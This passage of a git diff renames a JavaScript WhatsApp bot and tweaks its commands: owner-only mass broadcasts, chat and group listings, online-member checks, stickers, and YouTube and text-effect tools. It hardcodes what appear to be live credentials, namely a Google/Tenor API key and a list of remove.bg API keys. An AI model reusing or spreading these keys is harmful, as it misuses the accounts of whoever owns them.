+                    await Elza3emgonBot.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 }
             }
             break
@@ -1623,7 +1623,7 @@ break
                 if (!m.quoted) throw false
                 let { chat, fromMe, id, isBaileys } = m.quoted
                 if (!isBaileys) throw 'هذه الرساله لم يرسلها البوت ولا يمكنني حذفها'
-                ElgazarBot.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
+                Elza3emgonBot.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
             }
             break
             case 'report': case 'ابلاغ': {
@@ -1633,25 +1633,25 @@ break
                let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${text}`
                let ments = [ownernya, me]
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS FOR THE REPORT' }, type: 1 }]
-            await ElgazarBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
+            await Elza3emgonBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
             let akhji = `Report Sent\nTo Owner @${ownernya.split('@')[0]}\n*Thank you for the report🙏*\n_Your number will be blocked_\n_If the Report is Only Created_`
-            await ElgazarBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
             }
             break
             
-            case 'bctext': case 'broadcasttext': case 'broadcast':
+            case 'bctext': case 'broadcasttext': case 'broadcast': case 'bc':
 			    if (!isCreator) throw mess.owner
 		            if (!text) throw `Enter text`
 		                            var data = await store.chats.all()
                             for (let i of data) {
-                               ElgazarBot.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
+                               Elza3emgonBot.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                                await sleep(1000)
                             }
                             break
 case 'اذاعه': case 'شير': case 'broadcastvideo': case 'broadcastvid':
 if(!isCreator) throw mess.owner
-        if (!text) throw `enter text`
-        let getGroups = await ElgazarBot.groupFetchAllParticipating()
+        if (!text) throw `Enter Text`
+        let getGroups = await Elza3emgonBot.groupFetchAllParticipating()
         let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
         let xeoncast = groups.map(v => v.id)
         m.reply(` شير في ${xeoncast.length} جروب في ${xeoncast.length * 1.5} ثانيه`)
@@ -1659,46 +1659,46 @@ if(!isCreator) throw mess.owner
 let txt = `${ownername}' اذاعه\n\nالرساله : ${text}`
 if(/image/.test(mime)) {
 let media = await quoted.download()
-await ElgazarBot.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
+await Elza3emgonBot.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
 }
 if(/video/.test(mime)){
 let media = await quoted.download()
-await ElgazarBot.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
+await Elza3emgonBot.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
 }
             }
         m.reply(`اذاعه بنجاح في ${xeoncast.length} جروب`)      
         break
             case 'q': case 'quoted': {
 		if (!m.quoted) return m.reply('Reply Message!!')
-		let wokwol = await ElgazarBot.serializeM(await m.getQuotedObj())
+		let wokwol = await Elza3emgonBot.serializeM(await m.getQuotedObj())
 		if (!wokwol.quoted) return m.reply('The message you replied to does not contain a reply')
 		await wokwol.quoted.copyNForward(m.chat, true)
             }
 	    break
-            case 'listpc': {
+            case 'listpc': case 'الاعضاء': {
                  let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                  let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                  for (let i of anulistp) {
                      let nama = store.messages[i].array[0].pushName
                      teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                  }
-                 ElgazarBot.sendTextWithMentions(m.chat, teks, m)
+                 Elza3emgonBot.sendTextWithMentions(m.chat, teks, m)
              }
              break
-                case 'listgc': {
+                case 'listgc': case 'الجروبات': {
                  let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                  let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                  for (let i of anulistg) {
-                     let metadata = await ElgazarBot.groupMetadata(i)
+                     let metadata = await Elza3emgonBot.groupMetadata(i)
                      teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                  }
-                 ElgazarBot.sendTextWithMentions(m.chat, teks, m)
+                 Elza3emgonBot.sendTextWithMentions(m.chat, teks, m)
              }
              break
              case 'الصاحيين': case 'المتصلين': {
                     let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                     let online = [...Object.keys(store.presences[id]), botNumber]
-                    ElgazarBot.sendText(m.chat, '𓆩  *قفشتكم يا ورعان👾*  𓆪:\n\n' + online.map(v => '◐ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
+                    Elza3emgonBot.sendText(m.chat, '𓆩  *بطل كلام ف الخاص انت وهي😹*  𓆪:\n\n' + online.map(v => '◐ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
              }
              break
 case 'sticker': case 's': case 'ملصق': case 'ستيكر': {
@@ -1706,12 +1706,12 @@ case 'sticker': case 's': case 'ملصق': case 'ستيكر': {
             m.reply(mess.wait)
                     if (/image/.test(mime)) {
                 let media = await quoted.download()
-                let encmedia = await ElgazarBot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+                let encmedia = await Elza3emgonBot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                 await fs.unlinkSync(encmedia)
             } else if (/video/.test(mime)) {
                 if ((quoted.msg || quoted).seconds > 11) return m.reply('*الحد الادني في الفيديو لصنع الاستيكر 9 ثواني!*')
                 let media = await quoted.download()
-                let encmedia = await ElgazarBot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+                let encmedia = await Elza3emgonBot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                 await fs.unlinkSync(encmedia)
             } else {
                 throw `*عذرا ارسل ستيكر او فيديو لا يتعدي الـ9 ثواني و اعمل ريبلاي علي الفيديو او الصوره واكتب : ستيكر*`
@@ -1763,7 +1763,7 @@ break
 		if (!emoji2) throw `مثال : ${prefix + command} 😅+🤔`
 		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
 		for (let res of anumojimix.results) {
-		    let encmedia = await ElgazarBot.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
+		    let encmedia = await Elza3emgonBot.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
 		    await fs.unlinkSync(encmedia)
 		}
 	    }
@@ -1772,7 +1772,7 @@ break
 	    if (!text) throw `Example : ${prefix + command} 😅+🤔`
 		let anumix2 = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
 		for (let res of anumix2.results) {
-		    let encmedia = await ElgazarBot.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
+		    let encmedia = await Elza3emgonBot.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
 		    await fs.unlinkSync(encmedia)
 		}
 	    }
@@ -1790,7 +1790,7 @@ break
         : m.text;
       const SpeakEngine = require("google-tts-api"); 
       const texttospeechurl = SpeakEngine.getAudioUrl(texttosay, {lang: "ar", slow: false, host: "https://translate.google.com",});
-      ElgazarBot.sendMessage(m.chat,{audio: {url: texttospeechurl,},mimetype: "audio/mpeg",fileName: `ElgazarBotSpeechEngine.mp3`,},{quoted: m,});
+      Elza3emgonBot.sendMessage(m.chat,{audio: {url: texttospeechurl,},mimetype: "audio/mpeg",fileName: `Elza3emgonBotSpeechEngine.mp3`,},{quoted: m,});
     }
     break 
 	case 'smeme': case 'اكتب': case 'كتابه': {
@@ -1799,10 +1799,10 @@ if (!text) return m.reply(`رد علي صوره واكتب ${prefix + command} *
 if (text.includes('|')) return m.reply(`رد علي صوره واكتب ${prefix + command} *والنص*`)
 if (!/image/.test(mime)) return m.reply(`رد علي صوره واكتب ${prefix + command} *والنص*`)
 m.reply(mess.wait)
-mee = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
+mee = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
 mem = await TelegraPh(mee)
 meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
-memek = await ElgazarBot.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
+memek = await Elza3emgonBot.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(memek)
 }
 break
@@ -1810,13 +1810,13 @@ case 'لصوره': case 'toimg': case 'لصورة': {
                 if (!quoted) throw 'Reply Image'
                 if (!/webp/.test(mime)) throw `رد علي استيكر واكتب *${prefix + command}*`
                 m.reply(mess.wait)
-                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
+                let media = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
                 let ran = await getRandom('.png')
                 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                     fs.unlinkSync(media)
                     if (err) throw err
                     let bufferimg13x = fs.readFileSync(ran)
-                    ElgazarBot.sendMessage(m.chat, { image: bufferimg13x }, { quoted: m })
+                    Elza3emgonBot.sendMessage(m.chat, { image: bufferimg13x }, { quoted: m })
                     fs.unlinkSync(ran)
                 })
             }
@@ -1826,9 +1826,9 @@ case 'لفيديو': case 'tovideo': {
                 if (!/webp/.test(mime)) throw `رد علي استيكر واكتب *${prefix + command}*`
                 m.reply(mess.wait)
 		let { webp2mp4File } = require('./lib/uploader')
-                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
+                let media = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
                 let webpToMp4 = await webp2mp4File(media)
-                await ElgazarBot.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
+                await Elza3emgonBot.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                 await fs.unlinkSync(media)
             }
             break
@@ -1839,7 +1839,7 @@ case 'لفيديو': case 'tovideo': {
             let media = await quoted.download()
             let { toAudio } = require('./lib/converter')
             let audio = await toAudio(media, 'mp4')
-            ElgazarBot.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
+            Elza3emgonBot.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
             }
             break
             case 'tomp3': {
@@ -1850,7 +1850,7 @@ case 'لفيديو': case 'tovideo': {
             let media = await quoted.download()
             let { toAudio } = require('./lib/converter')
             let audio = await toAudio(media, 'mp4')
-            ElgazarBot.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${ElgazarBot.user.name}.mp3`}, { quoted : m })
+            Elza3emgonBot.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${Elza3emgonBot.user.name}.mp3`}, { quoted : m })
             }
             break
             case 'tovn': case 'toptt': {
@@ -1860,7 +1860,7 @@ case 'لفيديو': case 'tovideo': {
             let media = await quoted.download()
             let { toPTT } = require('./lib/converter')
             let audio = await toPTT(media, 'mp4')
-            ElgazarBot.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
+            Elza3emgonBot.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
             }
             break
             case 'لجيف': case 'لمتحرك': {
@@ -1868,9 +1868,9 @@ case 'لفيديو': case 'tovideo': {
                 if (!/webp/.test(mime)) throw `رد علي استيكر واكتب *${prefix + command}*`
                 m.reply(mess.wait)
 		let { webp2mp4File } = require('./lib/uploader')
-                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
+                let media = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
                 let webpToMp4 = await webp2mp4File(media)
-                await ElgazarBot.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
+                await Elza3emgonBot.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                 await fs.unlinkSync(media)
             }
             break
@@ -1882,7 +1882,7 @@ case 'لفيديو': case 'tovideo': {
 	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
 	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
 	    hmm = await './src/remobg-'+getRandom('')
-	    localFile = await ElgazarBot.downloadAndSaveMediaMessage(quoted, hmm)
+	    localFile = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted, hmm)
 	    outputFile = await './src/hremo-'+getRandom('.png')
 	    m.reply(mess.wait)
 	    remobg.removeBackgroundFromImageFile({
@@ -1893,7 +1893,7 @@ case 'لفيديو': case 'tovideo': {
 	      scale: "100%",
 	      outputFile 
 	    }).then(async result => {
-	    ElgazarBot.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
+	    Elza3emgonBot.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
 	    await fs.unlinkSync(localFile)
 	    await fs.unlinkSync(outputFile)
 	    })
@@ -1908,7 +1908,7 @@ case 'لفيديو': case 'tovideo': {
                 for (let i of search.all) {
                     teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
                 }
-                ElgazarBot.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
             break
         case 'google': {
@@ -1951,7 +1951,7 @@ if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
                 buttonText: "Videos",
                 mentions: parseMention(teskd), sections
             }
-            return ElgazarBot.sendMessage(m.chat, listMessage, {
+            return Elza3emgonBot.sendMessage(m.chat, listMessage, {
                 quoted: m
             })
             }
@@ -1982,7 +1982,7 @@ if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
                 buttonText: "اختار",
                 mentions: parseMention(teskd), sections
             }
-            return ElgazarBot.sendMessage(m.chat, listMessage, {
+            return Elza3emgonBot.sendMessage(m.chat, listMessage, {
                 quoted: m
             })
             }
@@ -2014,6 +2014,7 @@ if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
 *┃🍁القناه :* ${anulay.author.url}
 *┃🎲الوصف :* ${anulay.description}
 *┃🌿 الرابط :* ${anulay.url}
+
 ┃اسم البوت : 📶 𝑬𝑳𝒁𝑨3𝑬𝑴 𝑮𝑶𝑵 📶 
 
 ┗━━━━━━━━━❊`,
@@ -2021,7 +2022,7 @@ if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
                     buttons: buttons,
                     headerType: 4
                 }
-                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
 case 'playmp3': case 'اغنيه': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
@@ -2031,7 +2032,7 @@ let yts = require("youtube-yts")
         let search = await yts(text)
         let anup3k = search.videos[0]
 const pl= await xeonplaymp3.mp3(anup3k.url)
-await ElgazarBot.sendMessage(m.chat,{
+await Elza3emgonBot.sendMessage(m.chat,{
     audio: fs.readFileSync(pl.path),
     fileName: anup3k.title + '.mp3',
     mimetype: 'audio/mp4', ptt: true,
@@ -2055,7 +2056,7 @@ let ytsmp4 = require("youtube-yts")
         let xeonsearch13 = await ytsmp4(text)
         let anuvidoke4 = xeonsearch13.videos[0]
 const pl2= await xeonplaymp4.mp4(anuvidoke4.url)
-await ElgazarBot.sendMessage(m.chat,{
+await Elza3emgonBot.sendMessage(m.chat,{
     document: {url:pl2.videoUrl},
     fileName: anuvidoke4.title + '.mp4',
     mimetype: 'video/mp4',
@@ -2075,7 +2076,7 @@ case 'ytmp3': case 'ytaudio': //credit: Ray Senpai ❤️ https://github.com/Ete
 const xeonaudp3 = require('./lib/ytdl2')
 if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) throw `Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`
 const audio=await xeonaudp3.mp3(text)
-await ElgazarBot.sendMessage(m.chat,{
+await Elza3emgonBot.sendMessage(m.chat,{
     audio: fs.readFileSync(audio.path),
     mimetype: 'audio/mp4', ptt: true,
     contextInfo:{
@@ -2097,8 +2098,8 @@ break
                 let quality = args[1] ? args[1] : '128kbps'
                 let media = await yta(text, quality)
                 if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
-                ElgazarBot.sendImage(m.chat, media.thumb, `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '128kbps'}`, m)
-                ElgazarBot.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
+                Elza3emgonBot.sendImage(m.chat, media.thumb, `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '128kbps'}`, m)
+                Elza3emgonBot.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
             }
             break
 case 'ytmp4': case 'ytvideo': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
@@ -2110,7 +2111,7 @@ const ytc=`
 *${themeemoji}Date:* ${vid.date}
 *${themeemoji}Duration:* ${vid.duration}
 *${themeemoji}Quality:* ${vid.quality}`
-await ElgazarBot.sendMessage(m.chat,{
+await Elza3emgonBot.sendMessage(m.chat,{
     video: {url:vid.videoUrl},
     caption: ytc
 },{quoted:m})
@@ -2121,7 +2122,7 @@ break
                 let quality = args[1] ? args[1] : '360p'
                 let media = await ytv(text, quality)
                 if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
-                ElgazarBot.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '360p'}` }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '360p'}` }, { quoted: m })
             }
             break
 case 'pinterest': {
@@ -2129,7 +2130,7 @@ case 'pinterest': {
 		let { pinterest } = require('./lib/scraper')
                 anupint = await pinterest(text)
                 result = anupint[Math.floor(Math.random() * anupint.length)]
-                ElgazarBot.sendMessage(m.chat, { image: { url: result }, caption: `${themeemoji} Media Url : `+result }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { image: { url: result }, caption: `${themeemoji} Media Url : `+result }, { quoted: m })
             }
             break
             case 'waifu': {
@@ -2144,15 +2145,15 @@ case 'pinterest': {
                     buttons: buttons,
                     headerType: 4
                 }
-                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
 	    case 'تطقيم': case 'طقم': {
                 m.reply(mess.wait)
                 let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
                 let random = anucpp[Math.floor(Math.random() * anucpp.length)]
-                ElgazarBot.sendMessage(m.chat, { image: { url: random.male }, caption: `ولد🙎🏻‍♂️` }, { quoted: m })
-                ElgazarBot.sendMessage(m.chat, { image: { url: random.female }, caption: `بنت🙍🏻‍♀️` }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { image: { url: random.male }, caption: `ولد🙎🏻‍♂️` }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { image: { url: random.female }, caption: `بنت🙍🏻‍♀️` }, { quoted: m })
             }
 	    break
             case 'coffee': case 'قهوه': {
@@ -2161,12 +2162,12 @@ case 'pinterest': {
                 ]
                 let buttonMessage = {
                     image: { url: 'https://coffee.alexflipnote.dev/random' },
-                    caption: `☕ ها هي قهوتك`,
+                    caption: `☕ احلى قهوه ليك`,
                     footer: botname,
                     buttons: buttons,
                     headerType: 4
                 }
-                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
             case 'wallpaper': {
@@ -2184,7 +2185,7 @@ case 'pinterest': {
                     buttons: buttons,
                     headerType: 4
                 }
-                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
             case 'wikimedia': {
@@ -2202,7 +2203,7 @@ case 'pinterest': {
                     buttons: buttons,
                     headerType: 4
                 }
-                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
  case 'تقصير':{
@@ -2225,7 +2226,7 @@ case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 
  case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
 case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
 case 'lava': case 'rockart': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
- case 'firework': case 'skeleton': case 'blackpinkart': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
+ case 'firework': case 'skeleton': case 'gonpinkart': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
              if (!q) throw `Example : ${prefix + command} ${global.ownername}`
              m.reply(mess.wait)
              let link
@@ -2281,13 +2282,13 @@ case 'lava': case 'rockart': case 'bloodglas': case 'halloween': case 'darkgold'
              if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
              if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
              if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
-             if (/blackpinkart/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
+             if (/gonpinkart/.test(command)) link = 'https://textpro.me/create-gonpink-logo-style-online-1001.html'
              if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
              if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
              if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                 if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
              let anutexpro = await maker.textpro(link, q)
-                ElgazarBot.sendMessage(m.chat, { image: { url: anutexpro }, caption: `Made by ${global.botname}` }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { image: { url: anutexpro }, caption: `Made by ${global.botname}` }, { quoted: m })
              }
              break
 case'glitch3':
@@ -2297,7 +2298,7 @@ teks1 = q.split("|")[0]
 teks2 = q.split("|")[1]
 maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
     `${teks1}`,`${teks2}`])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2306,7 +2307,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
     `${q}`,])
-.then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+.then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break
 
@@ -2315,7 +2316,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
  maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
      `${q}`,])
-    .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+    .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
      break
 
@@ -2324,7 +2325,7 @@ case 'lion2':
   m.reply(mess.wait)
   maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
       `${q}`,])
-     .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+     .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
      .catch((err) => console.log(err));
      break
 
@@ -2333,7 +2334,7 @@ case 'papercut':
       m.reply(mess.wait)
       maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
 `${q}`,])
-         .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+         .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
          .catch((err) => console.log(err));
          break
 
@@ -2342,7 +2343,7 @@ case 'transformer':
       m.reply(mess.wait)
       maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
 `${q}`,])
-.then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+.then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break
    
@@ -2353,7 +2354,7 @@ case 'harrypot':
        teks2 = q.split("|")[1]
        maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
  `${teks1}`,`${teks2}`])
- .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+ .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
  break
 
@@ -2362,7 +2363,7 @@ case 'neondevil':
       m.reply(mess.wait)
       maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
 `${q}`,])
-         .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+         .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
          .catch((err) => console.log(err));
          break
 
@@ -2371,7 +2372,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 
@@ -2380,7 +2381,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
